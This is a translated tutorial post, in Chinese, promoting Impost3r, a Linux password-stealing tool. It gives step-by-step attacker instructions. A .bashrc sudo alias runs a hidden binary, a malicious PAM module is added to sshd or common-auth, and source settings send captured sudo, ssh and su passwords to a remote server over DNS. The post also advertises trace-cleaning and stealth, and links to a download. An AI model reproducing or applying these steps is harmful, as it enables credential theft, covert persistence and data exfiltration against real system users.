# impost 3r:Linux 密码窃贼

> 原文：<https://kalilinuxtutorials.com/impost3r-a-linux-password-thief/>

[![Impost3r : A Linux Password Thief](img/4a687c08e84e01dca72aae6bc105a816.png "Impost3r : A Linux Password Thief")](https://1.bp.blogspot.com/-_O0iQEZGUEo/YSXHS5I4jiI/AAAAAAAAKjg/C4lzwJ-Ch6MksCsFYQ367taiQ0mrQtG4gCLcBGAsYHQ/s728/PackageDNA%2B%25281%2529.png)

**Impost3r** 是一个 c 编写的旨在窃取多种 linux 密码(包括 ssh、su、sudo)的工具，
攻击者可以利用 Impost3r 制作陷阱窃取合法用户的密码 XD。

**特性**

*   自动清洁轨道
*   使用 DNS 传输结果
*   合法用户很难感受到这种攻击

**依赖关系**

*   （同 groundcontrolcenter）地面控制中心

**用途**

Impost3r 可用于窃取密码，包括 sudo、su 和 ssh 服务。这三个服务大致可以分为两类，sudo 和 ssh/su。我将在下面讨论它们。

**盗取须藤密码**

只需要普通用户的权限，并且只能窃取当前用户的密码。

*   首先，我假设攻击者已经控制了一台服务器，并且权限是普通用户
*   然后抄原文。bashrc 文件 cp ~/。bashrc /tmp/，并将这个副本放在您喜欢的任何地方(在这种情况下，我将使用/tmp/)
*   编辑原文。bashrc，并在文件末尾添加以下句子(参数“/tmp/.impost3r”必须与您指定的以下文件名相同):

```
alias sudo='impost3r() {
if [ -f "/tmp/.impost3r" ]; then
/tmp/.impost3r "$@" && unalias sudo
else
unalias sudo;sudo "$@"
fi
}; impost3r'
```

*   然后，保存并运行`**source ~/.bashrc**`
*   之后，攻击者需要编辑 Impost3r **`/sudo/main.c` :** 的源代码

```
/*
    Custom setting
*/
# define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
# define BACKUP_BASHRC "/tmp/.bashrc" \\Set the location where the backup .bashrc is on the server you attack.
# define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)
/*
    Send to server
*/
# define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
# define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.
# define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
# define REMOTE_PORT 53 \\Set the malicious server port

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.cache" \\Set the result file location if you want to save the result on the server 
```

*   保存源代码，并运行`**make**`
*   编译后获取. impost3r 文件。
*   将. impost3r 文件上传到目标服务器，并将其放在您指定的文件名下。
*   你应该做的最后一件事是在你的服务器(远程地址)的端口(远程端口)上运行一个 dns 服务器服务，然后等待奖励。

**演示**

![](img/ffcc4ca74596cf34605dc45fcb308498.png)

**提示**

*   当 Impost3r 成功窃取 sudo 密码时，它会自动清除它在目标服务器上留下的痕迹。

**盗取 ssh/su 密码**

窃取 ssh/su 密码与上面的 sudo 密码窃取方法不同。您需要 root 权限。这种方法可以窃取所有用户的密码。

下面以 Ubuntu 为例，Centos 也差不多，只是提到的文件位置可能略有不同

*   首先，假设攻击者控制了一台服务器，并获得了 root 权限

*   然后编辑 Impost3r 的`**/ssh_su/main.c**`源代码文件

```
/*
    Custom setting
*/
# define SSH_OR_BOTH 0 \\Set stealing mode, 0 means only steal ssh password, 1 means steal ssh and su password, the default is 0 (the difference will be mentioned later)
# define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)

/*
    Send to server
*/
# define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server(This option is valid only when SSH_OR_BOTH is 0)
# define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.(This option is valid only when SSH_OR_BOTH is 0)
# define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
# define REMOTE_PORT 53 \\Set the malicious server port

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.sshsucache" \\Set the result file location if you want to save the result on the server 
```

*   修改完成后，保存并执行当前目录中的“` make '”
*   获取编译后的文件 impost3r.so
*   将编译好的 impost3r.so 上传到目标服务器的`**/lib/x86_64-linux-gnu/security**`文件夹下。(不同的机器可能有不同的文件夹名称)
*   输入`**/etc/pam.d**`，然后有两种情况。如果选择的模式是只窃取 ssh 密码，那么您需要执行`**vi sshd**`并在文件末尾添加下面的语句。

```
auth optional impost3r.so
account optional impost3r.so
```

*   保存并退出，重启 sshd 服务`**service sshd restart**`
*   但是如果您选择一起窃取 ssh 和 su 密码，您需要执行`**vi common-auth**`，添加相同的语句，保存并退出，然后重启 sshd 服务
*   攻击者在其服务器上启动 dns 服务器程序，等待合法用户通过`**ssh**`登录目标服务器，或者使用`**su**`切换用户以获取密码。

**演示**

![](img/22673e9cb7e30851d30cf24b44766c2a.png)

**提示**

*   在盗取 ssh/su 密码的情况下，Impost3r 由于权限原因无法清除痕迹，需要攻击者自己清除
*   请注意，如果您设置只窃取 ssh 密码，可以保证您将几乎 100%地收到窃取的结果，但是如果您设置两者都窃取，您将不能保证您将 100%地收到结果。(选择在本地保存结果不会有这个问题，只有 dns 会)
*   不建议窃取 su 密码，因为用户的 ssh 密码与 su 密码相同。我觉得有 ssh 密码就够漂亮了。

**注意**

*   我用的 Dns 服务器 progran 是 [Fdns](https://github.com/deepdarkness/Fdns) ，我修改了一些 params，你可以在`**Fdns**`文件夹下找到修改后的源代码，用`**gcc -o dns main.c util.c**`自己编译。实际上，你可以使用任何类型的 dns 服务器，但是你使用的 dns 服务器必须能够对客户端做出 dns 响应，而不仅仅是记录 dns 请求(你还需要记录 dns 请求，否则你会丢失窃取结果)。
*   本项目编码只是为了好玩，逻辑结构和代码结构不够严谨，请不要太较真，也欢迎建议和 prs。

[**Download**](https://github.com/ph4ntonn/Impost3r)